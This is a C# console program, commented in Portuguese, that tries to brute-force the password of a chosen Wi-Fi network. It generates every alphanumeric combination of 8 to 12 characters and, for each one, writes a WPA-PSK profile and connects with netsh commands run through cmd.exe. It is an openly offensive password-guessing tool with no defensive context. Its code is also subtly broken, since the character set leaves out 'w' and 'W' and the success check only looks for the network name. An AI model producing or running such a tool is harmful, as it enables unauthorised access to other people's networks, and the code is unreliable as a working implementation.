using System;
using System.Diagnostics;
using System.Collections.Generic;

class Program
{
    static bool passwordCorrect = false;

    static void Main()
    {
        // Solicitar ao usuário a SSID da rede Wi-Fi:
        Console.Write("Digite o nome da rede Wi-Fi (SSID): ");
        string ssid = Console.ReadLine();

        char[] characters = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };

        // Define o comprimento máximo das combinações:
        int maxLength = 12;

        for (int length = 8; length <= maxLength && !passwordCorrect; length++)
        {
            foreach (var combination in GenerateCombinations(characters, "", length))
            {
                // Cria o perfil Wi-Fi com a combinação gerada:
                CreateWiFiProfile(ssid, combination);

                // Conectar-se à rede Wi-Fi:
                ConnectToWiFi(ssid);

                Console.WriteLine($"Tentando senha: {combination}");

                // Verifica se a senha está correta:
                passwordCorrect = CheckWiFiConnectionStatus(ssid);

                if (passwordCorrect)
                {
                    Console.WriteLine($"Senha correta encontrada: {combination}");
                    break;
                }

                // Aguarda 5 segundos antes de tentar a próxima senha
                System.Threading.Thread.Sleep(5000);
            }
        }

        if (!passwordCorrect)
        {
            Console.WriteLine("Nenhuma senha correta encontrada.");
        }

        Console.ReadKey();
    }

    static void CreateWiFiProfile(string ssid, string password)
    {
        string profileFilePath = "wifi_profile.xml";

        // Criar o arquivo XML com as credenciais:
        System.IO.File.WriteAllText(profileFilePath,
            $"<?xml version=\"1.0\"?>\n" +
            $"<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
            $"  <name>{ssid}</name>\n" +
            $"  <SSIDConfig>\n" +
            $"    <SSID>\n" +
            $"      <name>{ssid}</name>\n" +
            $"    </SSID>\n" +
            $"  </SSIDConfig>\n" +
            $"  <connectionType>ESS</connectionType>\n" +
            $"  <connectionMode>auto</connectionMode>\n" +
            $"  <security>\n" +
            $"    <keyManagement>wpa-psk</keyManagement>\n" +
            $"    <sharedKey>\n" +
            $"      <keyType>passPhrase</keyType>\n" +
            $"      <key>{password}</key>\n" +
            $"    </sharedKey>\n" +
            $"  </security>\n" +
            $"</WLANProfile>");

        // Executar o comando para adicionar o perfil:
        ExecuteCommand($"netsh wlan add profile filename=\"{profileFilePath}\"");
    }

    static void ConnectToWiFi(string ssid)
    {
        // Executar o comando para se conectar à rede:
        ExecuteCommand($"netsh wlan connect name=\"{ssid}\"");
    }

    static bool CheckWiFiConnectionStatus(string ssid)
    {
        string command = "netsh wlan show interfaces";
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();

        // Verifica se a SSID correta aparece na saída do comando
        return output.Contains(ssid);
    }

    static void ExecuteCommand(string command)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();

        // Ler a saída e a saída de erro:
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();

        if (process.ExitCode == 0)
        {
            Console.WriteLine($"Comando executado com sucesso: {command}");
        }
        else
        {
            Console.WriteLine($"Erro ao executar o comando: {error}");
        }
    }

    static IEnumerable<string> GenerateCombinations(char[] characters, string prefix, int length)
    {
        if (length == 0)
        {
            yield return prefix;
        }
        else
        {
            foreach (char c in characters)
            {
                // Executa a recurssão:

                foreach (var combination in GenerateCombinations(characters, prefix + c, length - 1))
                {
                    // Retorna a combinação gerada:
                    
                    yield return combination;
                }
            }
        }
    }
}